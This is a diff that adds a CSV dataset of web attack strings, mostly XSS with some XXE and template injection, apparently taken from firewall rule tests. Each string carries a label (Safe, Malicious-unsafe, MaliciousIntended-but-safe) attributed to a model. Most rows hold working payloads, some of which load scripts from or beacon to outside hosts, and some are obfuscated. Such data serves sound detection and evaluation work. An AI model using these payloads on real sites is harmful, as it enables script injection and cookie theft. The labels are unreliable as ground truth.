@@ -1,0 +1,133 @@
+﻿string,classification,Model
+"/demo/xss/xml/vuln.xml.php?input=<script+xmlns=""http://www.w3.org/1999/xhtml"">setTimeout(""top.frame2.location=""javascript:(function+()+{var+x+=+document.createElement(\\""script\\"");x.src+=+\\""//sdl.me/popup.js?//\\"";document.childNodes\\[0\\].appendChild(x);}());"""",1000)</script>&//",Malicious-unsafe,Claude Sonnet 4.5
+"/char_test?mime=text/xml&body=<x:script xmlns:x=""http://www.w3.org/1999/xhtml"" src=""data:,alert(1)"" />",Malicious-unsafe,Claude Sonnet 4.5
+foo=<xssonbeforehellfreezes=alerw(1)>,MaliciousIntended-but-safe,Claude Sonnet 4.5
+"/""onmouseover='prompt(document.cookie)'""",Malicious-unsafe,Claude Sonnet 4.5
+/index.php/<svg/onload=alert(),Malicious-unsafe,Claude Sonnet 4.5
+/?x=<script+>alert(1);</script>,Malicious-unsafe,Claude Sonnet 4.5
+/foo/bar</script><script>alert(1)</script>/,Malicious-unsafe,Claude Sonnet 4.5
+var=%uff1cscript%u0020%uff1ealert(1)%uff1c/script%uff1e,Malicious-unsafe,Claude Sonnet 4.5
+var=＜script ＞alert(1)＜/script＞,Malicious-unsafe,Claude Sonnet 4.5
+/?script+alert(1);/script=value,Safe,Claude Sonnet 4.5
+/?  onload= =vardata,Safe,Claude Sonnet 4.5
+/?  onabcdefgh= =vardata,Safe,Claude Sonnet 4.5
+/?  onab= =vardata,Safe,Claude Sonnet 4.5
+/?  onabcdefghijklmnopqrstuvwxyz= =vardata,Safe,Claude Sonnet 4.5
+"var=555-555-0199@example.com'||(selectextractvalue(xmltype('<?xmlversion=""1.0""encoding=""UTF-8""?><!DOCTYPEroot[<!ENTITY%lbsodSYSTEM""http://im8vx9fw5e2ibzctphxn9vauwl2m0joncfz5nu.example'||'foo.bar/"">%lbsod;",Safe,Claude Sonnet 4.5
+"var=<aaixmlns=""http://a.b/""xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""xsi:schemaLocation=""http://a.b/http://c5ipg3yqo8lcutvn8bghsptofflee424qxdq1f.examplefoo.bar/aai.xsd"">aai</aai>",Safe,Claude Sonnet 4.5
+"var=abcd'||(selectextractvalue(xmltype('<?xmlversion=""1.0""encoding=""UTF-8""?><!DOCTYPEroot[<!ENTITY%cggerSYSTEM""http://ved8pm79xruv3c46hup01827oyuzxtlx9qwjk8.example'||'foo.bar/"">%cgger;",Safe,Claude Sonnet 4.5
+"var=<acpxmlns:xi=""http://www.w3.org/2001/XInclude""><xi:includehref=""http://sgc5rj96zows5963jrrx3544qvwtnubvzomfa4.examplefoo.bar/foo""/></acp>",Safe,Claude Sonnet 4.5
+"var=/active/LFI/LFI-Detection-Evaluation-POST-200Valid/content.ini'||(selectextractvalue(xmltype('<?xmlversion=""1.0""encoding=""UTF-8""?><!DOCTYPEroot[<!ENTITY%grorjSYSTEM""http://yikbtpbc1uyy7f89lxt35b6as1yw1qpudm0co1.example'||'foo.bar/"">%grorj;",Safe,Claude Sonnet 4.5
+"var=<afaxmlns=""http://a.b/""xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""xsi:schemaLocation=""http://a.b/http://2mpfxtfg5y22bjcdp1x79faew52420q0er1hp6.examplefoo.bar/afa.xsd"">afa</afa>",Safe,Claude Sonnet 4.5
+"var=<chjxmlns=""http://a.b/""xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""xsi:schemaLocation=""http://a.b/http://1pre0sif8x51eifcs006ceddz45084w4kx7ovd.examplefoo.bar/chj.xsd"">chj</chj>",Safe,Claude Sonnet 4.5
+"var=/content.ini'||(selectextractvalue(xmltype('<?xmlversion=""1.0""encoding=""UTF-8""?><!DOCTYPEroot[<!ENTITY%dwusuSYSTEM""http://ehzrs5as0axe6v7pkdsj4r5qrhxcp6da12osch.example'||'foo.bar/"">%dwusu;",Safe,Claude Sonnet 4.5
+"var=EmptyValue'||(selectextractvalue(xmltype('<?xmlversion=""1.0""encoding=""UTF-8""?><!DOCTYPEroot[<!ENTITY%awpsdSYSTEM""http://0cddnr5evws01h2bfzn5zd0cm3sxvrjv7oufi4.example'||'foo.bar/"">%awpsd;",Safe,Claude Sonnet 4.5
+"var=file:/boot.ini'||(selectextractvalue(xmltype('<?xmlversion=""1.0""encoding=""UTF-8""?><!DOCTYPEroot[<!ENTITY%cwtpcSYSTEM""http://gvft67ouecbgkxlryf6litjs5jbd5htlhd43ss.example'||'foo.bar/"">%cwtpc;",Safe,Claude Sonnet 4.5
+"var=MatchedData:<!ENTITY%awfkeSYSTEMfoundwithinARGS_NAMES:1'||(selectextractvalue(xmltype('<?xmlversion=""1.0""encoding=""UTF-8""?><!DOCTYPEroot[<!ENTITY%awfkeSYSTEM""http://gj3tu7cu2czg8x9rmful6t7stjzcp4d812osch.example'||'foo.bar/"">%awfke;",Safe,Claude Sonnet 4.5
+"var=<oezxmlns=""http://a.b/""xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""xsi:schemaLocation=""http://a.b/http://eygr95rshaeenvop1d9jlrmq8hegib6bu4hx5m.examplefoo.bar/oez.xsd"">oez</oez>",Safe,Claude Sonnet 4.5
+"var=(selectextractvalue(xmltype('<?xmlversion=""1.0""encoding=""UTF-8""?><!DOCTYPEroot[<!ENTITY%anwynSYSTEM""http://y98bkp2csupyyfz9cxk3wbxaj1pzuzi26vtohd.example'||'foo.bar/"">%anwyn;",Safe,Claude Sonnet 4.5
+"var=<vqkxmlns:xi=""http://www.w3.org/2001/XInclude""><xi:includehref=""http://749kfyxln3k7toui76fcrksjeak3nybzzsmlaa.examplefoo.bar/foo""/></vqk>",Safe,Claude Sonnet 4.5
+"var=2010-01-01'||(selectextractvalue(xmltype('<?xmlversion=""1.0""encoding=""UTF-8""?><!DOCTYPEroot[<!ENTITY%fhkluSYSTEM""http://fzisa6stibffowpq2eakmsnr9ifhii6mueh45t.example'||'foo.bar/"">%fhklu;",Safe,Claude Sonnet 4.5
+/api/v1/query?q=7XMLNS,Safe,Claude Sonnet 4.5
+var=<chj,Safe,Claude Sonnet 4.5
+"xmlns=""http://a.b/""xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""xsi:schemaLocation=""http://a.b/http://1pre0sif8x51eifcs006ceddz45084w4kx7ovd.examplefoo.bar/chj.xsd"">chj</chj>",Safe,Claude Sonnet 4.5
+"9411400-1=<p style=""background:url(javascript:alert(1))>",Malicious-unsafe,Claude Sonnet 4.5
+"<p style=""background:url(javascript:alert(1))"">=941140-2",Malicious-unsafe,Claude Sonnet 4.5
+/bar,Safe,Claude Sonnet 4.5
+/bar?test=x=x:url(javascript,Safe,Claude Sonnet 4.5
+"941150-1=<a href=""test""",Safe,Claude Sonnet 4.5
+"payload=<ahref=#language=""JScript.Encode""onclick=""#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@"">XSS</a>",Malicious-unsafe,Claude Sonnet 4.5
+/char_test?mime=text/xml&body=<x onend=,Safe,Claude Sonnet 4.5
+"/char_test?mime=text/xml&body=""onzoom=",Safe,Claude Sonnet 4.5
+/char_test?mime=text/xml&body='formaction=,Safe,Claude Sonnet 4.5
+/char_test?mime=text/xml&body=< x: script,Safe,Claude Sonnet 4.5
+/char_test?mime=text/xml&body=$<f o r m,Safe,Claude Sonnet 4.5
+/?foo<f o r m=bar,Safe,Claude Sonnet 4.5
+/?foo=bar<f o r m,Safe,Claude Sonnet 4.5
+"var='""><svg/onload=(new(Image)).src='//m8vzjd10riomx3yxblmcnvaskjghsdz8xorciu7\56coreruleset.org'>",Malicious-unsafe,Claude Sonnet 4.5
+/get?mime=text/xml&body=$<d i a l o g,Safe,Claude Sonnet 4.5
+"payload=javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/""/+/onmouseover=1/+/[*/[]/+alert(1)//'></a>",Malicious-unsafe,Claude Sonnet 4.5
+/?var=javascript: \\\\t,Safe,Claude Sonnet 4.5
+/?var=javascript:\\\\u0020,Safe,Claude Sonnet 4.5
+"/?test= data: , <x>",Safe,Claude Sonnet 4.5
+941180-1=window.location,Safe,Claude Sonnet 4.5
+document.cookie=941180-2,Safe,Claude Sonnet 4.5
+941180-4=-->,Safe,Claude Sonnet 4.5
+"var=""-->'-->`--><!--#setvar=""qjr9""value=""kjkjg7sdk""--><!--#setvar=""fqz7""value=""sql4xxaq""--><!--#echovar=""qjr9""--><!--#echovar=""fq4p""-->",Safe,Claude Sonnet 4.5
+arg=...(document.domain)...,Safe,Claude Sonnet 4.5
+/javascript-manual/document.cookie,Safe,Claude Sonnet 4.5
+941181-1=-->,Safe,Claude Sonnet 4.5
+-->=941181-3,Safe,Claude Sonnet 4.5
+/baz,Safe,Claude Sonnet 4.5
+941190-1=<STYLE>@import'http://xss.rocks/xss.css';</STYLE>,Malicious-unsafe,Claude Sonnet 4.5
+x=<STYLE>@im\port'\jaasc\ript:alert('XSS')';</STYLE>,Malicious-unsafe,Claude Sonnet 4.5
+"941200-1=<v:vmlframe src=""foo.com/sup.fml""/>",Safe,Claude Sonnet 4.5
+"<v:vmlframe src=""foo.com/sup.fml""/>=941200-2",Safe,Claude Sonnet 4.5
+941210-1=ja&tab;vascript: ,MaliciousIntended-but-safe,Claude Sonnet 4.5
+ja&tab;vascript:        =941210-2,MaliciousIntended-but-safe,Claude Sonnet 4.5
+"{""url"":""javascript&#10:alert(7)""}",MaliciousIntended-but-safe,Claude Sonnet 4.5
+"{""url"":""jav&#13ascript:alert(7)""}",MaliciousIntended-but-safe,Claude Sonnet 4.5
+var=v&newline;b&tab;s&newline;c&newline;r&tab;i&tab;p&newline;t&colon;:&var2=whatever,MaliciousIntended-but-safe,Claude Sonnet 4.5
+"payload=<ahref=""vbscript:MsgBox+1"">XSS</a>",Malicious-unsafe,Claude Sonnet 4.5
+"var=<embedsrc=""deuce.swf"">&var2=whatever",Safe,Claude Sonnet 4.5
+"payload=<embedsrc=""javascript:alert(1)""></a>",Malicious-unsafe,Claude Sonnet 4.5
+/?var=<?import implementation =,Safe,Claude Sonnet 4.5
+/?test=<importimplementation=,Safe,Claude Sonnet 4.5
+"var=<metahttp-equiv=""refresh""&foo=var",Safe,Claude Sonnet 4.5
+"payload=<metahttp-equiv=""refresh""content=""0;http://evil?</a>",MaliciousIntended-but-safe,Claude Sonnet 4.5
+"var=<metacharset=""UTF-8"">&var2=whatever",Safe,Claude Sonnet 4.5
+"payload=<metacharset=""UTF-7""/>+ADw-script+AD4-alert(1)+ADw-/script+AD4-</a>",Malicious-unsafe,Claude Sonnet 4.5
+/?var=<link / asdf href  /= ,Safe,Claude Sonnet 4.5
+"payload=<linkhref=""xss.js""rel=stylesheettype=""text/javascript""></a>",MaliciousIntended-but-safe,Claude Sonnet 4.5
+/?var=<BASE dsfds HREF / =,Safe,Claude Sonnet 4.5
+"payload=<ahref=abcstyle=""width:101%;height:100%;position:absolute;font-size:1000px;"">xss<basehref=""//evil/</a>",MaliciousIntended-but-safe,Claude Sonnet 4.5
+"var=<appletcode=""deuce.class"">&var=whatever",Safe,Claude Sonnet 4.5
+payload=<appletonreadystatechange=alert(1)></applet></a>,Malicious-unsafe,Claude Sonnet 4.5
+/?<OBJECT data ==sdffdsa,Safe,Claude Sonnet 4.5
+"payload=<objectdata=""javascript:alert(1)""></a>",Malicious-unsafe,Claude Sonnet 4.5
+var=\xbcscript\xbealert(\xa2XSS\xa2)\xbc/script\xbe,Safe,Claude Sonnet 4.5
+var=\xc2\xbcscript\xc2\xbealert(\xc2\xa2XSS\xc2\xa2)\xc2\xbc/script\xc2\xbe,Safe,Claude Sonnet 4.5
+var=\xd0\xbcscript\xd0\xbealert(\xc2\xa2XSS\xc2\xa2)\xd0\xbc/script\xd0\xbe,Safe,Claude Sonnet 4.5
+var=\xd0\xb0\xd0\xb1\xd0\xb2\xd0\xb3\xd0\xb4\xd0\xb5\xd1\x91\xd0\xb6\xd0\xb7\xd0\xb8\xd0\xb9\xd0\xba\xd0\xbb\xd0\xbc\xd0\xbd\xd0\xbe\xd0\xbf\xd1\x80\xd1\x81\xd1\x82\xd1\x83\xd1\x84\xd1\x85\xd1\x86\xd1\x87\xd1\x88\xd1\x89\xd1\x8a\xd1\x8b\xd1\x8d\xd1\x8e\xd1\x8f,Safe,Claude Sonnet 4.5
+var=de_matten&sitzbez\xc3\x83\xc2\xbcge>fu\xc3\x83\xc2\x9fmatten_mt,Safe,Claude Sonnet 4.5
+var=\xbc\xbc,Safe,Claude Sonnet 4.5
+var=\xbe\xbe,Safe,Claude Sonnet 4.5
+var=\xd0\xbcscript\xd0\xbealert(\xc2\xa2XSS\xc2\xa2)\xd0\xbc/script\xd0,Safe,Claude Sonnet 4.5
+var=\xd0\xbcscript\xd0\xbealert(\xc2\xa2XSS\xc2\xa2)\xd0/script\xd0\xbe,Safe,Claude Sonnet 4.5
+var=\xd0\xb0\xd0\xb1\xd0\xb2\xd0\xb3\xd0\xb4\xd0\xb5\xd1\x91\xd0\xb6\xd0\xb7\xd0\xb8\xd0\xb9\xd0\xba\xd0\xbb\xd0\xbc\xd0\xbd\xd0\xbf\xd1\x80\xd1\x81\xd1\x82\xd1\x83\xd1\x84\xd1\x85\xd1\x86\xd1\x87\xd1\x88\xd1\x89\xd1\x8a\xd1\x8b\xd1\x8d\xd1\x8e\xd1\x8f,Safe,Claude Sonnet 4.5
+var=\xd0\xb0\xd0\xb1\xd0\xb2\xd0\xb3\xd0\xb4\xd0\xb5\xd1\x91\xd0\xb6\xd0\xb7\xd0\xb8\xd0\xb9\xd0\xba\xd0\xbb\xd0\xbd\xd0\xbe\xd0\xbf\xd1\x80\xd1\x81\xd1\x82\xd1\x83\xd1\x84\xd1\x85\xd1\x86\xd1\x87\xd1\x88\xd1\x89\xd1\x8a\xd1\x8b\xd1\x8d\xd1\x8e\xd1\x8f,Safe,Claude Sonnet 4.5
+test=\xbctest\xbetest(\xa2XSS\xa2)\xbc/test\xbe,Safe,Claude Sonnet 4.5
+var=<noscript#,Safe,Claude Sonnet 4.5
+"/?var=""in \u0076\u0061l\u0075e\u004F\u0066=",Safe,Claude Sonnet 4.5
+"payload=<iframesrcdoc=""<imgsrc=1onerror=alert(1)>""></iframe></a>",Malicious-unsafe,Claude Sonnet 4.5
+var='infoo.bar=&var2=whatever,Safe,Claude Sonnet 4.5
+/xx?id=%2bADw-script%2bAD4-,Malicious-unsafe,Claude Sonnet 4.5
+a=[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])(),Malicious-unsafe,Claude Sonnet 4.5
+a=(![]+[])[+!+[]],Malicious-unsafe,Claude Sonnet 4.5
+a=+!![],Safe,Claude Sonnet 4.5
+a=document+/*foo*/+.+++++cookie,MaliciousIntended-but-safe,Claude Sonnet 4.5
+a=document/*foo*/./*bar*/cookie,Safe,Claude Sonnet 4.5
+"a=window[""alert""](window[""document""][""cookie""])",Malicious-unsafe,Claude Sonnet 4.5
+"a=self[/*foo*/""alert""](self[""document""/*bar*/][""cookie""])",Malicious-unsafe,Claude Sonnet 4.5
+"a=self++/*jhb*/++[++/*bar*/++""alert""](""xss"")",MaliciousIntended-but-safe,Claude Sonnet 4.5
+"a=self[""$""][""globalEval""](""alert(1)"")",Malicious-unsafe,Claude Sonnet 4.5
+"a=self[""\x24""]",Safe,Claude Sonnet 4.5
+"a=(document)[""cookie""]",Safe,Claude Sonnet 4.5
+"a=(document/*foo*/)[""cookie""]",Safe,Claude Sonnet 4.5
+/login?user= x {{constructor.constructor('alert(1)')()}} . ff,Malicious-unsafe,Claude Sonnet 4.5
+"/?arg=setInterval(code, 1)",Malicious-unsafe,Claude Sonnet 4.5
+"/?arg=x"";setTimeout(name, 1)//",Malicious-unsafe,Claude Sonnet 4.5
+/?arg=eval('2 + 2'),Malicious-unsafe,Claude Sonnet 4.5
+/?arg=new Function(),Malicious-unsafe,Claude Sonnet 4.5
+/?arg=alert(),Malicious-unsafe,Claude Sonnet 4.5
+/?arg=atob(),Safe,Claude Sonnet 4.5
+/?arg=btoa(),Safe,Claude Sonnet 4.5
+/get?arg=prompt(),Malicious-unsafe,Claude Sonnet 4.5
+/get?arg=confirm(),Malicious-unsafe,Claude Sonnet 4.5
+/?xss=[].sort.call`${alert}1337`,Malicious-unsafe,Claude Sonnet 4.5
+/?xss=[  ] . sort . call ` ${ alert } 1337 `,Malicious-unsafe,Claude Sonnet 4.5
+/?xss=[  ] . /**/ sort . call ` ${ alert } 1337 `,Malicious-unsafe,Claude Sonnet 4.5
+/?xss=[].map.call`${eval}\\u{61}lert\x281337\x29`,Malicious-unsafe,Claude Sonnet 4.5
+/?xss=[ 1234 ]. map . call`${eval}/* asd */\\u{61}lert\x281337\x29`,Malicious-unsafe,Claude Sonnet 4.5
+/?xss=Reflect.apply.call`${navigation.navigate}${navigation}${[name]}`,Malicious-unsafe,Claude Sonnet 4.5
+/?test=Reflect.sort.call``,MaliciousIntended-but-safe,Claude Sonnet 4.5
